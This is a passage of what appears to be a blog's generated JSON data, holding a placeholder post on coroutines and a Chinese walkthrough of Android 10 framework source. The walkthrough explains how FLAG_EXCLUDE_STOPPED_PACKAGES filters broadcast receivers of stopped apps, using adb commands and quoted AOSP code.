href=\"https://github.com/tensorflow/tensorflow/tree/master/tensorflow/lite/nnapi\">NNAPI实现-TFLite</a></li>\n</ul>\n<p>挖坑待填，未完待续……</p>\n"},{"layout":"post","title":"走进各大语言的协程世界","subtitle":"开阔眼界。","date":"2020-01-19T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n> 想聊聊C++、C#、JS、Kotlin等语言中的协程实现与应用。\n\n挖坑待填，未完待续……\n","source":"_posts/2020-01-20-走进各大语言的协程世界.md","raw":"---\nlayout:     post\ntitle:      走进各大语言的协程世界\nsubtitle:   开阔眼界。\ndate:       2020-01-20\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Kotlin\n    - 前端\n---\n\n> 想聊聊C++、C#、JS、Kotlin等语言中的协程实现与应用。\n\n挖坑待填，未完待续……\n","slug":"走进各大语言的协程世界","published":1,"updated":"2024-03-25T07:31:25.859Z","comments":1,"photos":[],"link":"","_id":"cluaufh0w0024the60lsielvd","content":"<blockquote>\n<p>想聊聊C++、C#、JS、Kotlin等语言中的协程实现与应用。</p>\n</blockquote>\n<p>挖坑待填，未完待续……</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<blockquote>\n<p>想聊聊C++、C#、JS、Kotlin等语言中的协程实现与应用。</p>\n</blockquote>\n<p>挖坑待填，未完待续……</p>\n"},{"layout":"post","title":"源码茶舍之FLAG_EXCLUDE_STOPPED_PACKAGES与广播唤醒","subtitle":"品味AOSP。","date":"2020-01-20T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n### 发现\n\n我们先随便实现一个BroadcastReceiver，静态注册：\n```Kotlin\nclass TestReceiver : BroadcastReceiver() {\n    override fun onReceive(context: Context?, intent: Intent?) {\n        Log.w(\"TEST-1\", \"onReceive ${intent?.action}\")\n    }\n}\n```\n\n```xml\n<receiver android:name=\".TestReceiver\">\n    <intent-filter>\n        <action android:name=\"com.xxx.yyy.action_test_receiver\" />\n    </intent-filter>\n</receiver>\n```\n\n其他诸如Activity什么的就不写了哈，然后我们启动这个测试App之后，用adb命令发一条广播：\n\n```bash\nadb shell am broadcast -p com.xxx.yyy -a com.xxx.yyy.action_test_receiver\n```\n\n其中参数p表示广播接收所在进程包名，a表示action。命令执行后终端会输出：\n\n```bash\nBroadcasting: Intent { act=com.xxx.yyy.action_test_receiver flg=0x400000 pkg=com.xxx.yyy }\nBroadcast completed: result=0\n```\n\n然后查看logcat，我们可以如愿以偿地看到onReceive中的log。接下来我们杀掉进程，任意方式均可，这里我还是用adb命令，方便：\n\n```bash\nadb shell am force-stop com.xxx.yyy\n```\n\n杀进程后，再重复上面的广播发送命令，就会发现收不到广播了。这是为什么呢？表面看来这个问题很弱智，进程都死了当然不能再搞事。但实际上背后的逻辑还是值得探索的，系统也不是想象中那么简单地直接判断进程死活然后决定广播发送。\n\n### 探秘\n\n很显然我们要搞明白广播发送的底层逻辑。这里主要分析Framework层面的源码（基于Android 10），涉及到的关键类：\n\n```bash\nframeworks/base/core/java/android/content/Intent.java\nframeworks/base/services/core/java/com/android/server/am/ActivityManagerService.java\nframeworks/base/services/core/java/com/android/server/pm/PackageManagerService.java\nframeworks/base/services/core/java/com/android/server/pm/ComponentResolver.java\nframeworks/base/services/core/java/com/android/server/IntentResolver.java\n```\n\n关于广播发送的细节，可以参考此文：[https://www.jianshu.com/p/c5323a22f3f3](https://www.jianshu.com/p/c5323a22f3f3)，虽然源码版本不是最新，但基本逻辑差异不大，时序图也画得非常清晰。下面我们只针对文题简单地分析关键路径即可。\n\n当我们乐呵呵地调用了 `sendBroadcast` 方法之后，会调用到AMS（ActivityManagerService）的 `broadcastIntent` 方法，进而调用内部的 `broadcastIntentLocked` 方法（此处插入一个题外话：很多同学可能经常见到源码里 `xxxLocked` 这种方法，这个locked是什么意思呢？顾名思义就是加锁咯，即你要调用这些locked后缀的方法时，必须保证是线程安全的，所以一般就会看到synchronize关键字，这也算是AOSP的编码规范吧）。\n\n由于 `broadcastIntentLocked` 方法非常长，我们只截取关键片段：\n\n```java\n    final int broadcastIntentLocked(Intent intent/*省略18个参数*/) {\n        intent = new Intent(intent);\n\t\t// ...\n        // By default broadcasts do not go to stopped apps.\n        intent.addFlags(Intent.FLAG_EXCLUDE_STOPPED_PACKAGES);\n        // ...\n        // Figure out who all will receive this broadcast.\n        List receivers = null;\n        List<BroadcastFilter> registeredReceivers = null;\n        // Need to resolve the intent to interested receivers...\n        if ((intent.getFlags()&Intent.FLAG_RECEIVER_REGISTERED_ONLY)\n                 == 0) {\n            receivers = collectReceiverComponents(intent, resolvedType, callingUid, users);\n        }\n        // ...\n    }\n```\n\n可以看到，起手就是new Intent(intent)，为什么不直接使用参数中的intent来进行后续操作呢？此处一个小细节可以看出源码逻辑的谨慎，去查Intent的构造方法就知道，这是对入参的拷贝，避免被其他线程修改。\n然后最关键的便是下面的 `FLAG_EXCLUDE_STOPPED_PACKAGES` ，注释也写得很清楚，即**广播发送会排除（exclude）已停止运行的进程**。\n\n但我初次分析时看了半天没发现是怎么排除的，于是找这个flag引用的地方，在 **Intent** 源码中发现一个方法，判断该intent是否要排除已停止的进程：\n\n```java\n    public boolean isExcludingStopped() {\n        return (mFlags&(FLAG_EXCLUDE_STOPPED_PACKAGES|FLAG_INCLUDE_STOPPED_PACKAGES))\n                == FLAG_EXCLUDE_STOPPED_PACKAGES;\n    }\n```\n\n非常好，我们直接查 `isExcludingStopped` 方法的引用，发现在 **IntentResolver** 中：\n\n```java\n    private void buildResolveList(Intent intent, FastImmutableArraySet<String> categories,\n            boolean debug, boolean defaultOnly, String resolvedType, String scheme,\n            F[] src, List<R> dest, int userId) {\n        // ...\n        final boolean excludingStopped = intent.isExcludingStopped();\n\t\t// ...\n        for (i=0; i<N && (filter=src[i]) != null; i++) {\n            // ...\n            if (excludingStopped && isFilterStopped(filter, userId)) {\n                if (debug) {\n                    Slog.v(TAG, \"  Filter's target is stopped; skipping\");\n                }\n                continue;\n            }\n        }\n        // ...\n    }\n```\n\n这是通过intent构造resolve列表的一个私有方法，代码也非常清晰，此判断逻辑 `excludingStopped && isFilterStopped` 过滤了最后要启动的组件。其中 `isFilterStopped` 是真正判断进程是否已停止的方法，而 **excludingStopped** 是我们刚才传入的flag对应的控制标识。所以要过滤掉已停止进程有两个必要条件，**一是这个进程真的死了，二是开发者要通过flag来声明确实需要过滤**（是不是超人性化哈哈哈）。\n\n因此，我们也可以声明不需要过滤，即给intent设置 `FLAG_EXCLUDE_STOPPED_PACKAGES` 的兄弟flag：`FLAG_INCLUDE_STOPPED_PACKAGES` （注意是 **include**），这样在发送广播时，即便是已停止的进程，也能接收到了。这就是上古时期通过广播唤醒死亡进程的方法，现在基本上被各大ROM厂商给优化没了，一般都是三方应用被禁，系统应用依然可以。\n\n分析到此，其实只是有头有尾，但没有中间过程，`broadcastIntentLocked` 最终怎么就调到了 `buildResolveList` 呢？\n我们回到上面的 `broadcastIntentLocked` 方法，其中的 `receivers` 对象存储的是静态广播的集合，`registeredReceivers` 则是动态广播的集合。我们只看静态广播即可，它来自于 `collectReceiverComponents` 方法，此方法最后返回的receiver肯定是被过滤后的：\n\n```java\n    private List<ResolveInfo> collectReceiverComponents(Intent intent, String resolvedType,\n            int callingUid, int[] users) {\n        // ...\n        List<ResolveInfo> receivers = null;\n        try {\n            // ...\n            for (int user : users) {\n                // ...\n                List<ResolveInfo> newReceivers = AppGlobals.getPackageManager()\n                        .queryIntentReceivers(intent, resolvedType, pmFlags, user).getList();\n                // ...\n                if (newReceivers != null && newReceivers.size() == 0) {\n                    newReceivers = null;\n                }\n                if (receivers == null) {\n                    receivers = newReceivers;\n                // ...\n            }\n        } catch (RemoteException ex) {\n            // pm is in same process, this will never happen.\n        }\n        return receivers;\n    }\n```\n\n这个方法内部逻辑较为简单，我们可以看到最终receivers的来源便是那个 `queryIntentReceivers` 方法，此方法实现在PMS（PackageManagerService）里面：\n\n```java\n    @Override\n    public @NonNull ParceledListSlice<ResolveInfo> queryIntentReceivers(Intent intent,\n            String resolvedType, int flags, int userId) {\n        return new ParceledListSlice<>(\n                queryIntentReceiversInternal(intent, resolvedType, flags, userId,\n                        false /*allowDynamicSplits*/));\n    }\n\n    private @NonNull List<ResolveInfo> queryIntentReceiversInternal(Intent intent,\n            String resolvedType, int flags, int userId, boolean allowDynamicSplits) {\n        // ...\n        synchronized (mPackages) {\n            String pkgName = intent.getPackage();\n            if (pkgName == null) {\n                final List<ResolveInfo> result =\n                        mComponentResolver.queryReceivers(intent, resolvedType, flags, userId);\n                return applyPostResolutionFilter(\n                        result, instantAppPkgName, allowDynamicSplits, callingUid, false, userId,\n                        intent);\n            }\n            final PackageParser.Package pkg = mPackages.get(pkgName);\n            if (pkg != null) {\n                final List<ResolveInfo> result = mComponentResolver.queryReceivers(\n                        intent, resolvedType, flags, pkg.receivers, userId);\n                return applyPostResolutionFilter(\n                        result, instantAppPkgName, allowDynamicSplits, callingUid, false, userId,\n                        intent);\n            }\n            return Collections.emptyList();\n        }\n    }\n```\n\n最终receiver集合的查询操作在私有方法中，由 `mComponentResolver.queryReceivers` 得来，似乎越来越接近真相了，马上查看ComponentResolver：\n\n```java\n    List<ResolveInfo> queryReceivers(Intent intent, String resolvedType, int flags, int userId) {\n        synchronized (mLock) {\n            return mReceivers.queryIntent(intent, resolvedType, flags, userId);\n        }\n    }\n\n    List<ResolveInfo> queryReceivers(Intent intent, String resolvedType, int flags,\n            List<PackageParser.Activity> receivers, int userId) {\n        synchronized (mLock) {\n            return mReceivers.queryIntentForPackage(intent, resolvedType, flags, receivers, userId);\n        }\n    }\n```\n\n这里正好对应上面的两个不同情况下的调用，它们最终都会调用到 `queryIntent` 方法，此方法在ComponentResolver的一个静态内部类ActivityIntentResolver中实现：\n\n```java\n    private static final class ActivityIntentResolver\n            extends IntentResolver<PackageParser.ActivityIntentInfo, ResolveInfo> {\n        @Override\n        public List<ResolveInfo> queryIntent(Intent intent, String resolvedType,\n                boolean defaultOnly, int userId) {\n            // ...\n            return super.queryIntent(intent, resolvedType, defaultOnly, userId);\n        }\n\n        List<ResolveInfo> queryIntent(Intent intent, String resolvedType, int flags,\n                int userId) {\n            // ...\n            return super.queryIntent(intent, resolvedType,\n                    (flags & PackageManager.MATCH_DEFAULT_ONLY) != 0,\n                    userId);\n        }\n        // ...\n    }\n```\n\n内部类的中的 `queryIntent` 方法只是做了一些参数处理，进一步调用的是父类的实现，这个父类也就是起初我们提到的 **IntentResolver**：\n\n```java\n    public List<R> queryIntent(Intent intent, String resolvedType, boolean defaultOnly,\n            int userId) {\n        // ...\n        if (firstTypeCut != null) {\n            buildResolveList(intent, categories, debug, defaultOnly, resolvedType,\n                    scheme, firstTypeCut, finalList, userId);\n        }\n        if (secondTypeCut != null) {\n            buildResolveList(intent, categories, debug, defaultOnly, resolvedType,\n                    scheme, secondTypeCut, finalList, userId);\n        }\n        if (thirdTypeCut != null) {\n            buildResolveList(intent, categories, debug, defaultOnly, resolvedType,\n                    scheme, thirdTypeCut, finalList, userId);\n        }\n        if (schemeCut != null) {\n            buildResolveList(intent, categories, debug, defaultOnly, resolvedType,\n                    scheme, schemeCut, finalList, userId);\n        }\n        filterResults(finalList);\n        sortResults(finalList);\n\t\t// ...\n        return finalList;\n    }\n```\n\n看上面的 `buildResolveList` 方法，照应了开头分析的结果。最终返回的 **finalList** 也就是过滤之后的receiver集合。\n\n### 总结\n\n- 在广播发送的前序步骤（位于AMS）里，通过 `intent.addFlags(Intent.FLAG_EXCLUDE_STOPPED_PACKAGES);` 设置了标识，以声明广播不发给已停止的进程，层层调用后最终在 **IntentResolver** 的 `buildResolveList` 方法中实现过滤。\n- 在原生Android的设计逻辑中，若要突破上述限制，在 `sendBroadcast` 之前，给intent添加 flag：`FLAG_INCLUDE_STOPPED_PACKAGES` 即可。但鉴于各ROM厂商的正负优化，这个操作已经不适用了。\n","source":"_posts/2020-01-21-源码茶舍之FLAG_EXCLUDE_STOPPED_PACKAGES与广播唤醒.md","raw":"---\nlayout:     post\ntitle:      源码茶舍之FLAG_EXCLUDE_STOPPED_PACKAGES与广播唤醒\nsubtitle:   品味AOSP。\ndate:       2020-01-21\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - AOSP\n---\n\n### 发现\n\n我们先随便实现一个BroadcastReceiver，静态注册：\n```Kotlin\nclass TestReceiver : BroadcastReceiver() {\n    override fun onReceive(context: Context?, intent: Intent?) {\n        Log.w(\"TEST-1\", \"onReceive ${intent?.action}\")\n    }\n}\n```\n\n```xml\n<receiver android:name=\".TestReceiver\">\n    <intent-filter>\n        <action android:name=\"com.xxx.yyy.action_test_receiver\" />\n    </intent-filter>\n</receiver>\n```\n\n其他诸如Activity什么的就不写了哈，然后我们启动这个测试App之后，用adb命令发一条广播：\n\n```bash\nadb shell am broadcast -p com.xxx.yyy -a com.xxx.yyy.action_test_receiver\n```\n\n其中参数p表示广播接收所在进程包名，a表示action。命令执行后终端会输出：\n\n```bash\nBroadcasting: Intent { act=com.xxx.yyy.action_test_receiver flg=0x400000 pkg=com.xxx.yyy }\nBroadcast completed: result=0\n```\n\n然后查看logcat，我们可以如愿以偿地看到onReceive中的log。接下来我们杀掉进程，任意方式均可，这里我还是用adb命令，方便：\n\n```bash\nadb shell am force-stop com.xxx.yyy\n```\n\n杀进程后，再重复上面的广播发送命令，就会发现收不到广播了。这是为什么呢？表面看来这个问题很弱智，进程都死了当然不能再搞事。但实际上背后的逻辑还是值得探索的，系统也不是想象中那么简单地直接判断进程死活然后决定广播发送。\n\n### 探秘\n\n很显然我们要搞明白广播发送的底层逻辑。这里主要分析Framework层面的源码（基于Android 10），涉及到的关键类：\n\n```bash\nframeworks/base/core/java/android/content/Intent.java\nframeworks/base/services/core/java/com/android/server/am/ActivityManagerService.java\nframeworks/base/services/core/java/com/android/server/pm/PackageManagerService.java\nframeworks/base/services/core/java/com/android/server/pm/ComponentResolver.java\nframeworks/base/services/core/java/com/android/server/IntentResolver.java\n```\n\n关于广播发送的细节，可以参考此文：[https://www.jianshu.com/p/c5323a22f3f3](https://www.jianshu.com/p/c5323a22f3f3)，虽然源码版本不是最新，但基本逻辑差异不大，时序图也画得非常清晰。下面我们只针对文题简单地分析关键路径即可。\n\n当我们乐呵呵地调用了 `sendBroadcast` 方法之后，会调用到AMS（ActivityManagerService）的 `broadcastIntent` 方法，进而调用内部的 `broadcastIntentLocked` 方法（此处插入一个题外话：很多同学可能经常见到源码里 `xxxLocked` 这种方法，这个locked是什么意思呢？顾名思义就是加锁咯，即你要调用这些locked后缀的方法时，必须保证是线程安全的，所以一般就会看到synchronize关键字，这也算是AOSP的编码规范吧）。\n\n由于 `broadcastIntentLocked` 方法非常长，我们只截取关键片段：\n\n```java\n    final int broadcastIntentLocked(Intent intent/*省略18个参数*/) {\n        intent = new Intent(intent);\n\t\t// ...\n        // By default broadcasts do not go to stopped apps.\n        intent.addFlags(Intent.FLAG_EXCLUDE_STOPPED_PACKAGES);\n        // ...\n        // Figure out who all will receive this broadcast.\n        List receivers = null;\n        List<BroadcastFilter> registeredReceivers = null;\n        // Need to resolve the intent to interested receivers...\n        if ((intent.getFlags()&Intent.FLAG_RECEIVER_REGISTERED_ONLY)\n                 == 0) {\n            receivers = collectReceiverComponents(intent, resolvedType, callingUid, users);\n        }\n        // ...\n    }\n```\n\n可以看到，起手就是new Intent(intent)，为什么不直接使用参数中的intent来进行后续操作呢？此处一个小细节可以看出源码逻辑的谨慎，去查Intent的构造方法就知道，这是对入参的拷贝，避免被其他线程修改。\n然后最关键的便是下面的 `FLAG_EXCLUDE_STOPPED_PACKAGES` ，注释也写得很清楚，即**广播发送会排除（exclude）已停止运行的进程**。\n\n但我初次分析时看了半天没发现是怎么排除的，于是找这个flag引用的地方，在 **Intent** 源码中发现一个方法，判断该intent是否要排除已停止的进程：\n\n```java\n    public boolean isExcludingStopped() {\n        return (mFlags&(FLAG_EXCLUDE_STOPPED_PACKAGES|FLAG_INCLUDE_STOPPED_PACKAGES))\n                == FLAG_EXCLUDE_STOPPED_PACKAGES;\n    }\n```\n\n非常好，我们直接查 `isExcludingStopped` 方法的引用，发现在 **IntentResolver** 中：\n\n```java\n    private void buildResolveList(Intent intent, FastImmutableArraySet<String> categories,\n            boolean debug, boolean defaultOnly, String resolvedType, String scheme,\n            F[] src, List<R> dest, int userId) {\n        // ...\n        final boolean excludingStopped = intent.isExcludingStopped();\n\t\t// ...\n        for (i=0; i<N && (filter=src[i]) != null; i++) {\n            // ...\n            if (excludingStopped && isFilterStopped(filter, userId)) {\n                if (debug) {\n                    Slog.v(TAG, \"  Filter's target is stopped; skipping\");\n                }\n                continue;\n            }\n        }\n        // ...\n    }\n```\n\n这是通过intent构造resolve列表的一个私有方法，代码也非常清晰，此判断逻辑 `excludingStopped && isFilterStopped` 过滤了最后要启动的组件。其中 `isFilterStopped` 是真正判断进程是否已停止的方法，而 **excludingStopped** 是我们刚才传入的flag对应的控制标识。所以要过滤掉已停止进程有两个必要条件，**一是这个进程真的死了，二是开发者要通过flag来声明确实需要过滤**（是不是超人性化哈哈哈）。\n\n因此，我们也可以声明不需要过滤，即给intent设置 `FLAG_EXCLUDE_STOPPED_PACKAGES` 的兄弟flag：`FLAG_INCLUDE_STOPPED_PACKAGES` （注意是 **include**），这样在发送广播时，即便是已停止的进程，也能接收到了。这就是上古时期通过广播唤醒死亡进程的方法，现在基本上被各大ROM厂商给优化没了，一般都是三方应用被禁，系统应用依然可以。\n\n分析到此，其实只是有头有尾，但没有中间过程，`broadcastIntentLocked` 最终怎么就调到了 `buildResolveList` 呢？\n我们回到上面的 `broadcastIntentLocked` 方法，其中的 `receivers` 对象存储的是静态广播的集合，`registeredReceivers` 则是动态广播的集合。我们只看静态广播即可，它来自于 `collectReceiverComponents` 方法，此方法最后返回的receiver肯定是被过滤后的：\n\n```java\n    private List<ResolveInfo> collectReceiverComponents(Intent intent, String resolvedType,\n            int callingUid, int[] users) {\n        // ...\n        List<ResolveInfo> receivers = null;\n        try {\n            // ...\n            for (int user : users) {\n                // ...\n                List<ResolveInfo> newReceivers = AppGlobals.getPackageManager()\n                        .queryIntentReceivers(intent, resolvedType, pmFlags, user).getList();\n                // ...\n                if (newReceivers != null && newReceivers.size() == 0) {\n                    newReceivers = null;\n                }\n                if (receivers == null) {\n                    receivers = newReceivers;\n                // ...\n            }\n        } catch (RemoteException ex) {\n            // pm is in same process, this will never happen.\n        }\n        return receivers;\n    }\n```\n\n这个方法内部逻辑较为简单，我们可以看到最终receivers的来源便是那个 `queryIntentReceivers` 方法，此方法实现在PMS（PackageManagerService）里面：\n\n```java\n    @Override\n    public @NonNull ParceledListSlice<ResolveInfo> queryIntentReceivers(Intent intent,\n            String resolvedType, int flags, int userId) {\n        return new ParceledListSlice<>(\n                queryIntentReceiversInternal(intent, resolvedType, flags, userId,\n                        false /*allowDynamicSplits*/));\n    }\n\n    private @NonNull List<ResolveInfo> queryIntentReceiversInternal(Intent intent,\n            String resolvedType, int flags, int userId, boolean allowDynamicSplits) {\n        // ...\n        synchronized (mPackages) {\n            String pkgName = intent.getPackage();\n            if (pkgName == null) {\n                final List<ResolveInfo> result =\n                        mComponentResolver.queryReceivers(intent, resolvedType, flags, userId);\n                return applyPostResolutionFilter(\n                        result, instantAppPkgName, allowDynamicSplits, callingUid, false, userId,\n                        intent);\n            }\n            final PackageParser.Package pkg = mPackages.get(pkgName);\n            if (pkg != null) {\n                final List<ResolveInfo> result = mComponentResolver.queryReceivers(\n                        intent, resolvedType, flags, pkg.receivers, userId);\n                return applyPostResolutionFilter(\n                        result, instantAppPkgName, allowDynamicSplits, callingUid, false, userId,\n                        intent);\n            }\n            return Collections.emptyList();\n        }\n    }\n```\n\n最终receiver集合的查询操作在私有方法中，由 `mComponentResolver.queryReceivers` 得来，似乎越来越接近真相了，马上查看ComponentResolver：\n\n```java\n    List<ResolveInfo> queryReceivers(Intent intent, String resolvedType, int flags, int userId) {\n        synchronized (mLock) {\n            return mReceivers.queryIntent(intent, resolvedType, flags, userId);\n        }\n    }\n\n    List<ResolveInfo> queryReceivers(Intent intent, String resolvedType, int flags,\n            List<PackageParser.Activity> receivers, int userId) {\n        synchronized (mLock) {\n            return mReceivers.queryIntentForPackage(intent, resolvedType, flags, receivers, userId);\n        }\n    }\n```\n\n这里正好对应上面的两个不同情况下的调用，它们最终都会调用到 `queryIntent` 方法，此方法在ComponentResolver的一个静态内部类ActivityIntentResolver中实现：\n\n```java\n    private static final class ActivityIntentResolver\n            extends IntentResolver<PackageParser.ActivityIntentInfo, ResolveInfo> {\n        @Override\n        public List<ResolveInfo> queryIntent(Intent intent, String resolvedType,\n                boolean defaultOnly, int userId) {\n            // ...\n            return super.queryIntent(intent, resolvedType, defaultOnly, userId);\n        }\n\n        List<ResolveInfo> queryIntent(Intent intent, String resolvedType, int flags,\n                int userId) {\n            // ...\n            return super.queryIntent(intent, resolvedType,\n                    (flags & PackageManager.MATCH_DEFAULT_ONLY) != 0,\n                    userId);\n        }\n        // ...\n    }\n```\n\n内部类的中的 `queryIntent` 方法只是做了一些参数处理，进一步调用的是父类的实现，这个父类也就是起初我们提到的 **IntentResolver**：\n\n```java\n    public List<R> queryIntent(Intent intent, String resolvedType, boolean defaultOnly,\n            int userId) {\n        // ...\n        if (firstTypeCut != null) {\n            buildResolveList(intent, categories, debug, defaultOnly, resolvedType,\n                    scheme, firstTypeCut, finalList, userId);\n        }\n        if (secondTypeCut != null) {\n            buildResolveList(intent, categories, debug, defaultOnly, resolvedType,\n                    scheme, secondTypeCut, finalList, userId);\n        }\n        if (thirdTypeCut != null) {\n            buildResolveList(intent, categories, debug, defaultOnly, resolvedType,\n                    scheme, thirdTypeCut, finalList, userId);\n        }\n        if (schemeCut != null) {\n            buildResolveList(intent, categories, debug, defaultOnly, resolvedType,\n                    scheme, schemeCut, finalList, userId);\n        }\n        filterResults(finalList);\n        sortResults(finalList);\n\t\t// ...\n        return finalList;\n    }\n```\n\n看上面的 `buildResolveList` 方法，照应了开头分析的结果。最终返回的 **finalList** 也就是过滤之后的receiver集合。\n\n### 总结\n\n- 在广播发送的前序步骤（位于AMS）里，通过 `intent.addFlags(Intent.FLAG_EXCLUDE_STOPPED_PACKAGES);` 设置了标识，以声明广播不发给已停止的进程，层层调用后最终在 **IntentResolver** 的 `buildResolveList` 方法中实现过滤。\n- 在原生Android的设计逻辑中，若要突破上述限制，在 `sendBroadcast` 之前，给intent添加 flag：`FLAG_INCLUDE_STOPPED_PACKAGES` 即可。但鉴于各ROM厂商的正负优化，这个操作已经不适用了。\n","slug":"源码茶舍之FLAG_EXCLUDE_STOPPED_PACKAGES与广播唤醒","published":1,"updated":"2024-03-25T07:31:25.860Z","comments":1,"photos":[],"link":"","_id":"cluaufh0x0027the63d1r6349","content":"<h3 id=\"发现\"><a href=\"#发现\" class=\"headerlink\" title=\"发现\"></a>发现</h3><p>我们先随便实现一个BroadcastReceiver，静态注册：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TestReceiver</span> : <span class=\"type\">BroadcastReceiver</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">override</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">onReceive</span><span class=\"params\">(context: <span class=\"type\">Context</span>?, intent: <span class=\"type\">Intent</span>?)</span></span> &#123;</span><br><span class=\"line\">        Log.w(<span class=\"string\">&quot;TEST-1&quot;</span>, <span class=\"string\">&quot;onReceive <span class=\"subst\">$&#123;intent?.action&#125;</span>&quot;</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">receiver</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.TestReceiver&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;com.xxx.yyy.action_test_receiver&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>其他诸如Activity什么的就不写了哈，然后我们启动这个测试App之后，用adb命令发一条广播：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb shell am broadcast -p com.xxx.yyy -a com.xxx.yyy.action_test_receiver</span><br></pre></td></tr></table></figure>\n\n<p>其中参数p表示广播接收所在进程包名，a表示action。命令执行后终端会输出：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Broadcasting: Intent &#123; act=com.xxx.yyy.action_test_receiver flg=0x400000 pkg=com.xxx.yyy &#125;</span><br><span class=\"line\">Broadcast completed: result=0</span><br></pre></td></tr></table></figure>\n\n<p>然后查看logcat，我们可以如愿以偿地看到onReceive中的log。接下来我们杀掉进程，任意方式均可，这里我还是用adb命令，方便：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb shell am force-stop com.xxx.yyy</span><br></pre></td></tr></table></figure>\n\n<p>杀进程后，再重复上面的广播发送命令，就会发现收不到广播了。这是为什么呢？表面看来这个问题很弱智，进程都死了当然不能再搞事。但实际上背后的逻辑还是值得探索的，系统也不是想象中那么简单地直接判断进程死活然后决定广播发送。</p>\n<h3 id=\"探秘\"><a href=\"#探秘\" class=\"headerlink\" title=\"探秘\"></a>探秘</h3><p>很显然我们要搞明白广播发送的底层逻辑。这里主要分析Framework层面的源码（基于Android 10），涉及到的关键类：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frameworks/base/core/java/android/content/Intent.java</span><br><span class=\"line\">frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java</span><br><span class=\"line\">frameworks/base/services/core/java/com/android/server/pm/PackageManagerService.java</span><br><span class=\"line\">frameworks/base/services/core/java/com/android/server/pm/ComponentResolver.java</span><br><span class=\"line\">frameworks/base/services/core/java/com/android/server/IntentResolver.java</span><br></pre></td></tr></table></figure>\n\n<p>关于广播发送的细节，可以参考此文：<a href=\"https://www.jianshu.com/p/c5323a22f3f3\">https://www.jianshu.com/p/c5323a22f3f3</a>，虽然源码版本不是最新，但基本逻辑差异不大，时序图也画得非常清晰。下面我们只针对文题简单地分析关键路径即可。</p>\n<p>当我们乐呵呵地调用了 <code>sendBroadcast</code> 方法之后，会调用到AMS（ActivityManagerService）的 <code>broadcastIntent</code> 方法，进而调用内部的 <code>broadcastIntentLocked</code> 方法（此处插入一个题外话：很多同学可能经常见到源码里 <code>xxxLocked</code> 这种方法，这个locked是什么意思呢？顾名思义就是加锁咯，即你要调用这些locked后缀的方法时，必须保证是线程安全的，所以一般就会看到synchronize关键字，这也算是AOSP的编码规范吧）。</p>\n<p>由于 <code>broadcastIntentLocked</code> 方法非常长，我们只截取关键片段：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"title function_\">broadcastIntentLocked</span><span class=\"params\">(Intent intent<span class=\"comment\">/*省略18个参数*/</span>)</span> &#123;</span><br><span class=\"line\">      intent = <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>(intent);</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\">      <span class=\"comment\">// By default broadcasts do not go to stopped apps.</span></span><br><span class=\"line\">      